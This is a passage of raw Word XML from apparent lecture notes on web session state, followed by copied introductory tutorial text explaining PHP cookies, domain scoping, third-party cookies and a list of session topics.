    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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Approach #1: just keep state in main memory</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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Approach #2: store session state in files on disk</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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Approach #3: store session state in a database</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>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Most frameworks allow you to control session storage:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Provide an object that saves and restores session data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRPr="00BC1502" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC1502">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Server must eventually delete stale session data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRPr="00BC1502" w:rsidRDefault="00AB5160" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC1502">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Sessions have numerous security issues, which we will discuss later.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>PHP Session &amp; PHP Cookies with Example</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>What is Cookie?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="3" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="4" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>A cookie is a small file with the maximum size of 4KB that the web server stores on the client computer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="5" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="6" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Once a cookie has been set, all page requests that follow return the cookie name and value.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="7" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="8" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>A cookie can only be read from the domain that it has been issued from. For example, a cookie set using the domain </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>www.guru99.com</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>can not</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> be read from the domain </w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://career.guru99.com/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>career.guru99.com</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="9" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="10" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Most of the websites on the internet display elements from other domains such as advertising. The domains serving these elements can also set their own cookies. These are known as third party cookies.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="001E24C7" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="11" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="12" w:author="Unknown">
        <w:r w:rsidRPr="001E24C7">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>A cookie created by a user can only be visible to them. Other users cannot see its value.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="13" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="14" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Most web browsers have options for disabling cookies, third party cookies or both.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="15" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="16" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>If this is the case then PHP responds by passing the cookie token in the URL.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="17" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="18" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>The diagram shown below illustrates how cookies work.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="19" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6ACCE586" wp14:editId="518E3027">
            <wp:extent cx="5594350" cy="2161540"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="11" name="Picture 11" descr="PHP Cookies and PHP Sessi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P Cookies and PHP Session">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4350" cy="2161540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="20" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="21" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Here,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="22" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="23" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>1) A user requests for a page that stores cookies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="24" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="25" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>2) The server sets the cookie on the user’s computer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="26" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="27" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>3) Other page requests from the user will return the cookie name and value</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="28" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="29" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>In this tutorial, you will learn-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="30" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="31"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"3"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Why and when to use Cookies?</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32" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="33"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"4"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Creating Cookies</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34" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="35"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"5"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Retrieving the Cookie value</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36" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="37"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"6"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Delete Cookies</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38" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="39"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"7"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What is a Session?</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40" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="41"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"8"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Why and when to use Sessions?</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42" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="43"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"9"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Creating a Session</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="44" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="45" w:author="Unknown">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"https://www.guru99.com/cookies-and-sessions.html" \l "10"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Destroying Session Variables</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="46" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="47" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
